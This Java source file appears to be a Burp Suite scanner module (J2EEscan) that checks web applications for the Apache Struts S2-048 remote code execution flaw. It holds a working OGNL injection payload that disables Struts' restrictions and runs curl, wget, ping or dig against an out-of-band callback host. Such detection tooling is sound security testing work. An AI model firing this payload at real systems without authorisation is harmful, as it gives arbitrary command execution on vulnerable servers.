package burp.j2ee.issues.impl;

import burp.*;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;

import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class StrutsS2048OOB implements IModule {

    private static final String TITLE = "Struts S2-048 RCE (OOB)";
    private static final String DESCRIPTION = "J2EEscan identified OOB RCE S2-048 in the webpage"
            + "<b>References</b>:<br /><br />"
            + "http://struts.apache.org/docs/s2-048.html<br />"
            + "https://github.com/vulhub/vulhub/tree/master/struts2/s2-048<br />"
            + "https://waf.ninja/struts2-vulnerability-evolution";
    private PrintWriter stderr;
    private static final String REMEDY = "Upgrade to latest Apache Struts version";

    //Pattern.compile("file not found", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE),
    //Pattern.compile("java\\.io\\.FileNotFoundException", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE));

    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        String payload_template = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('RCE_CMD ATTACKER_DOMAIN').getInputStream())).(#q)}";
        IExtensionHelpers helpers = callbacks.getHelpers();
        List<IScanIssue> issues = new ArrayList<>();

        List<String> cmds = new ArrayList<>();
        cmds.add("curl");
        cmds.add("wget");
        cmds.add("ping");
        cmds.add("dig");


        for (String cmd : cmds) {

            IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();
            String currentCollaboratorPayload = collaboratorContext.generatePayload(true);
            String payload = payload_template.replace("ATTACKER_DOMAIN",currentCollaboratorPayload).replace("RCE_CMD", cmd);
            // make a request containing our injection test in the insertion point
            byte[] checkRequest = insertionPoint.buildRequest(payload.getBytes());

            IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(), checkRequest);

            //String response = helpers.bytesToString(checkRequestResponse.getResponse());
            List<IBurpCollaboratorInteraction> collaboratorInteractions = collaboratorContext.fetchCollaboratorInteractionsFor(currentCollaboratorPayload);

            if (!collaboratorInteractions.isEmpty()) {
                issues.add(new CustomScanIssue(
                        baseRequestResponse.getHttpService(),
                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                        checkRequestResponse,
                        TITLE,
                        DESCRIPTION,
                        REMEDY,
                        Risk.High,
                        Confidence.Firm
                ));
                return issues;
            }
        }

        return issues;
    }
}
